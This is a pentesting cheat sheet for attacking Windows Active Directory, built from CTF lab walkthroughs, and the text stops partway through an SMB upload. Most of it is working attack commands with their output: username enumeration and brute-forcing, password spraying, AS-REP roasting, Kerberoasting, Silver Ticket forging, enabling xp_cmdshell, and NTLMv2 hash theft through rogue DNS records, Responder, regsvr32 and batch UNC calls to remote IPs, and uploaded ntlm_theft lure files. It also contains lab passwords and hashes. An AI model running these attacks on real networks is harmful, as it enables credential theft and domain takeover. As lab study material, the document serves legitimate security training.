# Tools


```
1. Powerspoit  
                    - PowerSploit is a collection of Microsoft PowerShell modules
  a. PowerView.ps1  
                    - It contains a set of pure-PowerShell replacements for various windows "net *" commands
                    - Contains functions for Windows domain enumeration        
2. PowerMad.ps1 
                    - PowerShell modules for MachineAccountQuota functions and ADIDNS (Active Directory Integrated DNS) Abuse

3. PowerUp.ps1      - For Local Privilege Escalation

3. Impacket
                    - Collection of Python classes for working with network protocols
                    - Can be used for plenty of things from Enumeration to Exploitation

3. Rubeus.exe
                    - Can be used for plenty of things from Enumeration to Exploitation

```
- [Powershploit](https://github.com/PowerShellMafia/PowerSploit/tree/dev)

  - [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

  - [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)

- [PowerMad](https://github.com/Kevin-Robertson/Powermad?tab=readme-ov-file#powershell-machineaccountquota-and-dns-exploit-tools)

- [Impacket](https://github.com/fortra/impacket)

- [Rubeus](https://github.com/GhostPack/Rubeus) -> [Compliled version](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.0_Any/Rubeus.exe)

- [ASREPRoast.ps1](https://github.com/HarmJ0y/ASREPRoast) (Its functionality has been incorporated into Rubeus via the "asreproast" action)

**PowerView.ps1 Functions**

[Powerview's List of Domain Enumeration Functions](https://github.com/PowerShellMafia/PowerSploit/tree/dev/Recon#powerview)
```


```
**PowerMad Functions**

[Functions](https://github.com/Kevin-Robertson/Powermad#functions)
```
MachineAccountQuota Functions
DNS Functions
Dynamic Updates Functions
ADIDNS Functions
Miscellaneous Functions
```

**Impacket**

[Impacket Python scripts](https://github.com/fortra/impacket/tree/master/examples)

[Refer1](https://tools.thehacker.recipes/impacket/examples), [Refer2](https://www.coresecurity.com/core-labs/impacket)


```
- lookupsid.py            - Finding remote users/groups

- GetADUsers.py           - Finding other users with creds

- GetNPUsers.py           - Finding users with disabled PreAuthentication (UF_DONT_REQUIRE_PREAUTH)

- GetUserSPNs.py          - Find Kerberostable users, This will get us TGS for service account with SPN set and will dump its hash, further we can crack the hash

- ticketer.py             - Create Golden/Silver tickets from scratch or based on a template

- ticketConverter.py      - Convert kirbi files, commonly used by mimikatz, into ccache format file used by Impacket, and vice versa

- mssqlclient.py          - An MSSQL client, supporting SQL and Windows Authentications (hashes too). It also supports TLS.

- secretdump.py           - Performs various techniques to dump secrets from the remote machine without executing any agent there

- psexec.py               - Get Remote Shell, with creds or pass the hash

- wmiexec.py              - Get Remote Shell, with creds or pass the hash 

- addcomputer.py          - Can be to used to add a new computer account in the Active Directory, using the credentials of a domain user. 

- rbcd.py                 - Script for handling the msDS-AllowedToActOnBehalfOfOtherIdentity property of a target computer.

- GetST.py                - Given a password, hash, aesKey or TGT in ccache, this script will request a Service Ticket and save it as ccache. If the account has constrained delegation (with protocol transition) privileges you will be able to use the -impersonate switch to request the ticket on behalf another user.

- dacledit.py             - Edit DACL attributes of object, for example this can be used to grant full control to an object

- owneredit.py            - Edit Ownership of object

- smbclient.py            - client that will let you list shares and files, rename, upload and download files and create and delete directories, all using either username and password or username and hashes combination

```

**Rubeus**

[Command Line Usage](https://github.com/GhostPack/Rubeus?tab=readme-ov-file#command-line-usage)

# ENUMERATION
## BASIC ENUMERATION

* Check Users (if requried to confirm exact name)
```
*Evil-WinRM* PS C:\> net user
```

* AD Groups
```
# Check Group Members
*Evil-WinRM* PS C:\> net group 'Exchange Windows Permissions'


```

* Schedule Tasks
```
# Get a list of all scheduled tasks
C:\>schtasks /query /fo TABLE

# Querying the details
C:\>schtasks /query /tn <taskname> /v /fo list

 ```

## Domain Enumeration

## User Enumeration
```
1. Try to discover users using below tools (try more than one tool, just one might not give all users sometime)

  - impacket-lookupsid
  - crackmapexec        (list shares, if there is read permission on $IPC, then try to list users using crackmapexc)
  - impacket-GetNPUsers
  - rpcclient
  - ldapsearch

2. Validate users found using below tools

  - crackmapexec
  - Kerbute

3. Try to bruteforce RIDs using crackmapexec

4. Try to Bruteforce usernames using Kerbute with seclist list of usernames

5. Try to check if usernames have usernames as their password using crackmapexec

6. Password Spray users if any password found during enumeration

7. Brute Force each username with each password if password policy is having account lockout set to None

```
##### impacket-lookupsid.py
```
# In case we have read access on IPC$ share we can enumerate users either by using crackmapexec , or impacket-lookupsid.py

impacket-lookupsid 'guest'@10.10.130.255
 
impacket-lookupsid 'guest'@10.10.130.255 | cut -d " " -f 2 > usernames.txt

impacket-lookupsid flight.htb/svc_apache:'S@Ss!K@*t13'@flight.htb

impacket-lookupsid flight.htb/svc_apache:'S@Ss!K@*t13'@flight.htb | grep SidTypeUser | cut -d' ' -f 2 | cut -d'\' -f 2 | tee users
```

##### crackmapexec

```
# enumerate other users with annonymous or autheticated

crackmapexec smb  10.10.130.255 -u 'guest' -p '' --users
crackmapexec smb  10.10.11.202 -u 'SQL_SVC' -p 'REGGIE1234ronnie' --users

enum4linux -U 192.54.223.3 -p 445
```
```
# get hostnmae using crackmapexec
# crackmapexec is able to return a hostname, DC.streamIO.htb:

oxdf@hacky$ crackmapexec smb 10.10.11.158
SMB         10.10.11.158    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
```
```
# Confirm user exists by crackmapexec

crackmapexec smb 10.10.130.255 - usernames.txt -p 'foundpassword'
crackmapexec smb 10.5.20.134 -u Administrator -H e3c61a68f1b89ee6c8ba9507378dc88d
crackmapexec smb 10.10.130.255 - usernames.txt -H hashes.txt
```
**BruteForce RIDs**

https://0xdf.gitlab.io/2025/02/15/htb-cicada.html#smb---tcp-445

```
crackmapexec smb [ip] -u guest -p '' --rid-brute
```
```
crackmapexec smb CICADA-DC -u guest -p '' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 | tee users
```

**Check username as Passwords**
```
crackmapexec smb manager.htb -u users -p users --continue-on-success --no-brute
```

**Spray Password**
```
# Check if any other user uses same password

crackmapexec smb 10.10.130.255 - usernames.txt -p 'foundpassword' --continue-on-success
```


**BruteForce**
```
# Check Password policy - might require if you want to brute force and check account lockout threshold
# This with anaonymous only works older windows like 2003 or 8 for above it requires authentication

# check if Account Lockout Threshold is None

┌──(kali㉿kali)-[~]
└─$ crackmapexec  smb 10.10.10.172 --pass-pol -u '' -p ''                                                             
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\: 
SMB         10.10.10.172    445    MONTEVERDE       [+] Dumping password info for domain: MEGABANK
SMB         10.10.10.172    445    MONTEVERDE       Minimum password length: 7
SMB         10.10.10.172    445    MONTEVERDE       Password history length: 24
SMB         10.10.10.172    445    MONTEVERDE       Maximum password age: 41 days 23 hours 53 minutes 
SMB         10.10.10.172    445    MONTEVERDE       
SMB         10.10.10.172    445    MONTEVERDE       Password Complexity Flags: 000000
SMB         10.10.10.172    445    MONTEVERDE           Domain Refuse Password Change: 0
SMB         10.10.10.172    445    MONTEVERDE           Domain Password Store Cleartext: 0
SMB         10.10.10.172    445    MONTEVERDE           Domain Password Lockout Admins: 0
SMB         10.10.10.172    445    MONTEVERDE           Domain Password No Clear Change: 0
SMB         10.10.10.172    445    MONTEVERDE           Domain Password No Anon Change: 0
SMB         10.10.10.172    445    MONTEVERDE           Domain Password Complex: 0
SMB         10.10.10.172    445    MONTEVERDE       
SMB         10.10.10.172    445    MONTEVERDE       Minimum password age: 1 day 4 minutes 
SMB         10.10.10.172    445    MONTEVERDE       Reset Account Lockout Counter: 30 minutes 
SMB         10.10.10.172    445    MONTEVERDE       Locked Account Duration: 30 minutes 
SMB         10.10.10.172    445    MONTEVERDE       Account Lockout Threshold: None
SMB         10.10.10.172    445    MONTEVERDE       Forced Log off Time: Not Set



# Brute Forcing to check if password works for any user or vice versa

crackmapexec smb 10.5.20.134 -u users.txt -p pass.txt
```
**Create Wordlist to Brute Force**
```
# put initial usernames and other details found in enumeration in checklist
# add some months and seasons to it

# append year to words
for i in $(cat wordlist.txt); do echo $i; echo ${i}2019; echo ${i}2020; done; 

# append ! to words
for i in $(cat wordlist.txt); do echo $i; echo ${i}\!; done > t  

# generate more out of it
hashcat --force --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule 
hashcat --force --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule

# filter with length more than 7
hashcat --force --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule | sort -u | awk 'length($0) > 7' > t
```

**Validate if user exists**
```
# if we found users and corresponding passwords or hash (-H) then we can validate like this

crackmapexec smb 10.10.11.158 -u user.txt -p pass.txt --continue-on-success --no-bruteforce

crackmapexec smb 10.10.11.158 -u slack-users -p slack-pass --continue-on-success --no-bruteforce
crackmapexec smb 10.10.11.158 -u slack-users -p slack-pass --continue-on-success 


# try without --no-bruteforce to try each password with each user.
```
```
# If we only have users then we can validate like this

┌──(kali㉿kali)-[~/kerbrute]
└─$ impacket-GetNPUsers -no-pass streamIO.htb/ -usersfile users -format john -outputfile hashes.txt -dc-ip 10.10.11.158
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User yoshihide doesn't have UF_DONT_REQUIRE_PREAUTH set
```
**Validate if user can WinRM**
```
# In this case its not allowed to winrm

oxdf@hacky$ crackmapexec winrm 10.10.11.158 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r'
SMB         10.10.11.158    5985   NONE             [*] None (name:10.10.11.158) (domain:None)
HTTP        10.10.11.158    5985   NONE             [*] http://10.10.11.158:5985/wsman
WINRM       10.10.11.158    5985   NONE             [-] None\JDgodd:JDg0dd1s@d0p3cr3@t0r
```

##### impacket-GetADUsers.py
```
# Enumerate other uses in AD, using one user creds.

impacket-GetADUsers  'LAB.ENTERPRISE.THM/nik:ToastyBoi!' -dc-ip 10.10.131.138 -all

```
```
RPC
# Enumerate domain users
net rpc user  -U forest.htb.local/svc-alfresco%'s3rvice' -S 10.10.10.161

rpcclient -U "" -N 10.10.10.161 
rpcclient $> enumdomgroups
```

```
# Kerbute
root@kali# kerbrute userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.175

# This uses a huge list of username, this is only suitable for CTFs!, not in real engagements, in those we should find first list of using enumeration.
```

##### Rpcclient

**UserName Enumeration**
```
rpcclient -U "" -N 10.10.10.161 
rpcclient $> enumdomusers
```
**Reset Password of User**

This is very useful when you need to reset password of user form linux since you dont have shell on windows machine
```
# use the command setuserinfo2

└─$ rpcclient -U "support" 10.10.10.192 
Password for [WORKGROUP\support]:

# note password not machin policy will give such error

rpcclient $> setuserinfo2 audit2020 23 '0xdf'
result: NT_STATUS_PASSWORD_RESTRICTION
result was NT_STATUS_PASSWORD_RESTRICTION

# password that is according to policy will be accepted silently

rpcclient $> setuserinfo2 audit2020 23 '0xdf!!!'
rpcclient $> 
```
This can also be done in one line
```
rpcclient -U 'blackfield.local/support%#00^BlackKnight' 10.10.10.192 -c 'setuserinfo2 audit2020 23 "0xdf!!!"'
```
[More](https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html#password-reset-over-rpc)
[More](https://room362.com/posts/2017/reset-ad-user-password-with-linux/)

##### Kerbute

https://github.com/ropnop/kerbrute/releases/tag/v1.0.3
[Download](https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64)
```
└─$ wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64  

└─$ chmod +x kerbrute_linux_amd64 
```
**BruteForce UserNmaes to find Users**

https://github.com/danielmiessler/SecLists/blob/master/Usernames/cirt-default-usernames.txt

```
./kerbrute_linux_amd64 userenum /opt/SecLists/Usernames/cirt-default-usernames.txt --dc dc01.manager.htb -d manager.htb
```

**Confirm users exist**
```
./kerbrute_linux_amd64 userenum --dc 10.10.10.248 -d intelligence.htb users
```

# ABUSE KERBEROS
```
We can gain password of users using these attacks
```

#### AS-REP Roast

We can use list of users and send AS-REQ to KDC on behlf of them and recieve AS-REP message. Finally, to crack the harvested AS_REP messages, Hashcat or John can be used.

Root Cause? - The root cause here is `Pre-Authentication`, Pre-authentication is an optional Kerberos feature, when it is enabled the client sends a KRB_AS_REQ message that contains its identity in cleartext along with a timestamp encrypted in its secret key, It ensures the user is requesting a TGT for himself. But if Pre-authentication is disbaled for user, client can request TGT for this user and AS ie Authentication Server can verify if its the actual user requesting TGT, it simply sends TGT without caring, since this TGT is encrypted with users password hash, attacker can get that hash and crack it offlie. 

[More](https://wentzwu.com/2022/08/29/kerberos-pre-authentication/)


##### impacket-GetNPUsers.py
```
impacket-GetNPUsers  htb.local/  -format john -outputfile hashes.txt -dc-ip 10.10.10.161
```
```
impacket-GetNPUsers -no-pass raz0rblack.thm/ -usersfile users.txt -format john -outputfile hashes.txt -dc-ip 10.10.98.90
```
```
impacket-GetNPUsers -no-pass raz0rblack.thm/ -usersfile users.txt -format hashcat -outputfile hashes.txt -dc-ip 10.10.98.90
```
```
for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.192 blackfield.local/$user | grep krb5asrep; done
```
#### Kerberosting

Finding Service Accounts with SPN - Kerberosting (Finding Kerberostable User)

We could check to see if there are any service accounts in the domain. If there are service accounts with a SPN `Service Principle Name` set, we could Kerberoast them and attempt to crack their hash offline.

Root Cause? - The KDC and a service account has one thing in common ie the service account password. After the KDC gives us a TGT, it will then send us a TGS, which has been signed with the password hash of the service account. If we can get that TGS, we could take it offline and attempt to crack it to recover the password.
In AD if an authenticated user has valid TGT and knows a service SPN then he can request a TGS for that service, While TGT's are signed by a special account called KRBTGT, TGS's are signed with the hash of the requested service account. 

[More](https://www.misecurity.net/tryhackme-enterprise-walkthrough2/#why-this-works)
[More](https://0xdf.gitlab.io/2018/12/08/htb-active.html#kerberoasting)
[More](https://www.redsiege.com/wp-content/uploads/2020/08/Kerberoastv4.pdf)

##### impacket-GetUserSPNs.py
(This will get us TGS for service account with SPN set and will dump its hash, further we can crack the hash)
First we verify if there is Kerberostable User

```
impacket-GetUserSPNs 'LAB.ENTERPRISE.THM/nik:ToastyBoi!' -dc-ip 10.10.27.123
```
```
impacket-GetUserSPNs raz0rblack.thm/lvetrova -hashes f220d3988deb3f516c73f40ee16c431d:f220d3988deb3f516c73f40ee16c431d -dc-ip 10.10.240.181
```

Now that we’ve verified there is an account, we can use the request flag, to obtain the Kerberos TGT, and then crack the user’s password hash

```
impacket-GetUserSPNs 'LAB.ENTERPRISE.THM/nik:ToastyBoi!' -dc-ip 10.10.27.123 -request
```
```
impacket-GetUserSPNs raz0rblack.thm/lvetrova -hashes f220d3988deb3f516c73f40ee16c431d:f220d3988deb3f516c73f40ee16c431d -dc-ip 10.10.240.181 -request
```
```
In case you get error - Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
you need to update time according to domain, kerberos is very time sensitive

sudo apt install ntpdate  
nptupdate <IP>
```

#### Golden Ticket (Forged TGT)

#### Silver Ticket (Forged TGS)
Silver Tickets can be more dangerous than Golden Tickets – while the scope is more limited than Golden Tickets, the required hash is easier to get and there is no communication with a DC when using them, so detection is more difficult than Golden Tickets.

What it is? - Silver Tickets are forged Kerberos Ticket Granting Service (TGS) tickets, also called service tickets.
As shown in the following graphic, there is no AS-REQ / AS-REP (steps 1 & 2) and no TGS-REQ / TGS-REP (steps 3 & 4) communication with the Domain Controller. Since a Silver Ticket is a forged TGS, there is no communication with a Domain Controller.
![alt text](https://adsecurity.org/wp-content/uploads/2015/04/Visio-SilverTicket-Comms.png)
[More](https://0xdf.gitlab.io/2023/06/17/htb-escape.html#beyond-root---silver-ticket)
[More](https://adsecurity.org/?p=2011)

Typically when you want to authenticate to MSSQL, you ask for a Kerberos ticket for the service principle name (SPN). That request goes to the key distribution center (KDC) (typically the domain controller), where it looks up the user associated with that SPN, checks if the requested user is supposed to have access, and after a couple rounds of communication, returns a ticket for the user, encrypting it with the NTLM hash of the service account. Now when the user gives that ticket to the service, the service can decrypt it and use it as authentication.

In a Silver Ticket attack, all the communication with the DC is skipped. The attacker forges the service ticket (also called a TGS), and encrypts it with the service account’s NTLM, by doing so he'll be able to impersonate any user on MSSQL.

##### Ticketer.py

EXAMPLE FROM ESCAPE - HTB ROOM
https://0xdf.gitlab.io/2023/06/17/htb-escape.html#beyond-root---silver-ticket

Here on target we have a MSSQL service , we already have a user with which this service is running ie sql_svc with password REGGIE1234ronnie , found via xp_dirtree and responder

1. Collect Information
To generate a Silver Ticket, using ticketer.py, we will need the following information:
https://0xdf.gitlab.io/2023/06/17/htb-escape.html#collect-information
```
The NTLM hash for sql_svc.
The domain SID.
The domain name.
A SPN (it doesn’t have to be a valid SPN).
The name of the user to impersonate.
```
- If you have password and want to generate NTLM hash, you can do it using python `hashlib`

```
# NTLM is an MD4 with UTF-16 little ending encoding.

>>> import hashlib
>>> hashlib.new('md4', 'REGGIE1234ronnie'.encode('utf-16le')).digest().hex()
'1443ec19da4dac4ffc953bca1b57b4cf'
```

- Get Domain SID

`Get-ADDomain` returns information about the domain, including the SID:
```
*Evil-WinRM* PS C:\Users\sql_svc\Documents> Get-ADDomain | fl DomainSID

DomainSID : S-1-5-21-4078382237-1492182817-2568127209
```
2. Generate Forged TGS

Calculate the necessary information and saves the TGS in administrator.ccache, use the KRB5CCNAME environment variable to tell your system to use that service ticket to authenticate. This can be done either by running export KRB5CCNAME=administrator.ccache or by including KRB5CCNAME=administrator.ccache before each command
```
oxdf@hacky$ ticketer.py -nthash 1443ec19da4dac4ffc953bca1b57b4cf -domain-sid S-1-5-21-4078382237-1492182817-2568127209 -domain sequel.htb -spn doesnotmatter/dc.sequel.htb administrator
Impacket v0.10.1.dev1+20230608.100331.efc6a1c3 - Copyright 2022 Fortra

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for sequel.htb/administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in administrator.ccache
```

2. Connect using forged TGS

With this ticket, you can authenticate to MSSQL as administrator
```
oxdf@hacky$ KRB5CCNAME=administrator.ccache mssqlclient.py -k dc.sequel.htb
Impacket v0.10.1.dev1+20230608.100331.efc6a1c3 - Copyright 2022 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (sequel\Administrator  dbo@master)> select suser_name();
                       
--------------------   
sequel\Administrator 
```
From this point, I can read files from the box as administrator
```
SQL (sequel\Administrator  dbo@master)> SELECT * FROM OPENROWSET(BULK N'C:\users\ryan.cooper\desktop\user.txt', SINGLE_CLOB) AS Contents
BulkColumn                                
---------------------------------------   
b'358e669396e938f552b34d0ff56916dc\r\n'   

SQL (sequel\Administrator  dbo@master)> SELECT * FROM OPENROWSET(BULK N'C:\users\administrator\desktop\root.txt', SINGLE_CLOB) AS Contents
BulkColumn                                
---------------------------------------   
b'26f96af5f692d8c0e334d4706c140e8e\r\n'  
```
xp_cmdshell is still disabled, but unlike sql_svc, the administrator user has permissions to enable it:
```
SQL (sequel\Administrator  dbo@master)> xp_cmdshell whoami
[-] ERROR(DC\SQLMOCK): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
SQL (sequel\Administrator  dbo@master)> EXECUTE sp_configure 'show advanced options', 1
[*] INFO(DC\SQLMOCK): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sequel\Administrator  dbo@master)> RECONFIGURE
SQL (sequel\Administrator  dbo@master)> EXECUTE sp_configure 'xp_cmdshell', 1
[*] INFO(DC\SQLMOCK): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sequel\Administrator  dbo@master)> RECONFIGURE
SQL (sequel\Administrator  dbo@master)> xp_cmdshell whoami
output           
--------------   
sequel\sql_svc
```

# STEALING NTLMv2 HASHES

https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html#
https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/

### LLMNR

![alt text](https://0xdfimages.gitlab.io/img/responder-llmnr-poison.gif)

![alt text](https://0xdfimages.gitlab.io/img/1546870562452.webp)

We’ve captured a challenge/response, and that’s something I can crack.

You might say “sure, but in the real world, how often are people visiting non-existing hosts?” That’s fair, but on a large network, the odds that if you wait long enough someone will make a typo in a share name are pretty good.



### ADIDNS (Active Directory Integrated DNS)
#### Add DNS record -> Capture Net-NTLMv2 hash

##### DNSUpdate.py

[Download](https://github.com/Sagar-Jangam/DNSUpdate)

A python script to aid Responder in gathering more hashes even from different VLANs, which by default is not possible with Responder. The scripts does so by updating DNS entries in ADIDNS zones. The script requires a set of valid domain credentials (User account/ Machine account with a password or hash) to update the ADIDNS zones

**Attack Scenerio**


[More](https://www.hackingarticles.in/intelligence-hackthebox-walkthrough/)

```
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
  try {
    $request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
    if(.StatusCode -ne 200) {
      Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
    }
  } catch {}
}
```
During Enumeraion we found a Powershell script which makes HTTP web request to web servers in every 5 mins to check if they are up with 200 status. Its doing this using LDAP.

It was looking at AD entries where the object name started with `web` and finally sending out a WebRequest.

Now We need this WebRequest to reach our machine instead and for that we need to add a DNS record that points to us, so that we can capture auth request.

We can do this using tool `dnsupdate.py` . [Download](https://github.com/Sagar-Jangam/DNSUpdate)

```
usage: DNSUpdate.py [-h] [-DNS DNS] [-u USER] [-p PASSWORD] [-a ACTION] [-r RECORD] [-d DATA]
                    [-l LOGFILE]
```

1. Adding our DNS record startting with `web` ie web-doshi and the `data` ie the IP which we want it to resolve to (ie our server) with compromised user and password.

```
└─$ python3 dnsupdate.py -DNS 10.10.10.248 -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 -a ad -r web-doshi -d 10.10.14.6
Connecting to host...
Binding to host
Bind OK
/home/kali/DNS/dnsupdate.py:58: DeprecationWarning: please use dns.resolver.Resolver.resolve() instead
  res = dnsresolver.query(zone, 'SOA')
Adding the record
{'result': 0, 'description': 'success', 'dn': '', 'message': '', 'referrals': None, 'type': 'addResponse'}

```

2. Now we will start `Responder`, to check if any authentication request comes to us on our server.
```
└─$ sudo responder -I tun0
```
After 5 mins
```

[+] Listening for events...                                                                                                                                                                 

[HTTP] NTLMv2 Client   : 10.10.10.248
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:027e553ebec05e90:B5039117303BB668F6162E9F1ABF79DA:010100000000000012E93B23CFA3DB01263B05823FE6B6B30000000002000800560055004F00540001001E00570049004E002D004800340037003600430037004900510045004200480004001400560055004F0054002E004C004F00430041004C0003003400570049004E002D00480034003700360043003700490051004500420048002E00560055004F0054002E004C004F00430041004C0005001400560055004F0054002E004C004F00430041004C000800300030000000000000000000000000200000F938EB86F40FFFD807CB3DEFDC5BE8B3D2C135A71741DA03187591BE3CC06B8F0A0010000000000000000000000000000000000009003E0048005400540050002F007700650062002D0064006F007300680069002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000    
[*] Skipping previously captured hash for intelligence\Ted.Graves
```

##### DNStool.py

Add/modify/delete Active Directory Integrated DNS records via LDAP.

We can also do the same Attack Secenio using tool `dnstool.py` that comes with `Krbrelayx` . [Download](https://github.com/dirkjanm/krbrelayx)

But its giving error - dns.resolver.NXDOMAIN: The DNS query name does not exist: intelligence.htb.

DNStool.py [More](https://0xdf.gitlab.io/2021/11/27/htb-intelligence.html#capture-hash)


### Regsvr32

regsvr32 is a command-line utility in Windows used for registering and unregistering DLLs and ActiveX controls in the Windows Registry. 

```
regsvr32 /s /u /i://35.164.153.224/@OsandaMalith scrobj.dll
```

![alt text](https://i0.wp.com/osandamalith.com/wp-content/uploads/2017/03/regsvr32.png?ssl=1)

### Batch

There are many possible ways you can explore

```
echo 1 > //192.168.0.1/abc
pushd \\192.168.0.1\abc
cmd /k \\192.168.0.1\abc
cmd /c \\192.168.0.1\abc
start \\192.168.0.1\abc
mkdir \\192.168.0.1\abc
type\\192.168.0.1\abc
dir\\192.168.0.1\abc
find, findstr, [x]copy, move, replace, del, rename and many more!
```

![alt text](https://i0.wp.com/osandamalith.com/wp-content/uploads/2017/03/batch.png?ssl=1)

### SMB Write Access

https://0xdf.gitlab.io/2023/05/06/htb-flight.html#capture-netntlmv2

In addition to the read access, S.Moon has write access to Shared:
```
oxdf@hacky$ crackmapexec smb flight.htb -u S.Moon -p 'S@Ss!K@*t13' --shares
SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         flight.htb      445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
SMB         flight.htb      445    G0               [+] Enumerated shares
SMB         flight.htb      445    G0               Share           Permissions     Remark
SMB         flight.htb      445    G0               -----           -----------     ------
SMB         flight.htb      445    G0               ADMIN$                          Remote Admin
SMB         flight.htb      445    G0               C$                              Default share
SMB         flight.htb      445    G0               IPC$            READ            Remote IPC
SMB         flight.htb      445    G0               NETLOGON        READ            Logon server share 
SMB         flight.htb      445    G0               Shared          READ,WRITE      
SMB         flight.htb      445    G0               SYSVOL          READ            Logon server share 
SMB         flight.htb      445    G0               Users           READ            
SMB         flight.htb      445    G0               Web             READ  
```

With write access we can upload files that may act as a legitimate visiting user trying to authenticate out Attacker host, we can do that using [ntlm_theft](https://github.com/Greenwolf/ntlm_theft)

I’ll use ntml_theft.py to create all the files:

```
oxdf@hacky$ python ntlm_theft.py -g all -s 10.10.14.6 -f 0xdf
Created: 0xdf/0xdf.scf (BROWSE TO FOLDER)
Created: 0xdf/0xdf-(url).url (BROWSE TO FOLDER)
Created: 0xdf/0xdf-(icon).url (BROWSE TO FOLDER)
Created: 0xdf/0xdf.lnk (BROWSE TO FOLDER)
Created: 0xdf/0xdf.rtf (OPEN)
Created: 0xdf/0xdf-(stylesheet).xml (OPEN)
Created: 0xdf/0xdf-(fulldocx).xml (OPEN)
Created: 0xdf/0xdf.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: 0xdf/0xdf-(includepicture).docx (OPEN)
Created: 0xdf/0xdf-(remotetemplate).docx (OPEN)
Created: 0xdf/0xdf-(frameset).docx (OPEN)
Created: 0xdf/0xdf-(externalcell).xlsx (OPEN)
Created: 0xdf/0xdf.wax (OPEN)
Created: 0xdf/0xdf.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: 0xdf/0xdf.asx (OPEN)
Created: 0xdf/0xdf.jnlp (OPEN)
Created: 0xdf/0xdf.application (DOWNLOAD AND OPEN)
Created: 0xdf/0xdf.pdf (OPEN AND ALLOW)
Created: 0xdf/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: 0xdf/Autorun.inf (BROWSE TO FOLDER)
Created: 0xdf/desktop.ini (BROWSE TO FOLDER)
Generation Complete.
```

Connecting from the directory with the ntlm_theft output, I’ll upload all of them to the share:
```
oxdf@hacky$ smbclient //flight.htb/shared -U S.Moon 'S@Ss!K@*t13'
Try "help" to get a list of possible commands.
smb: \> prompt false
smb: \> mput *
NT_STATUS_ACCESS_DENIED opening remote file \0xdf-(frameset).docx
putting file 0xdf.jnlp as \0xdf.jnlp (0.7 kb/s) (average 0.7 kb/s)
NT_STATUS_ACCESS_DENIED opening remote file \0xdf.asx
putting file 0xdf.application as \0xdf.application (6.0 kb/s) (average 3.3 kb/s)
NT_STATUS_ACCESS_DENIED opening remote file \0xdf.htm
putting file desktop.ini as \desktop.ini (0.2 kb/s) (average 1.7 kb/s)
NT_STATUS_ACCESS_DENIED opening remote file \0xdf.rtf
NT_STATUS_ACCESS_DENIED opening remote file \0xdf-(icon).url
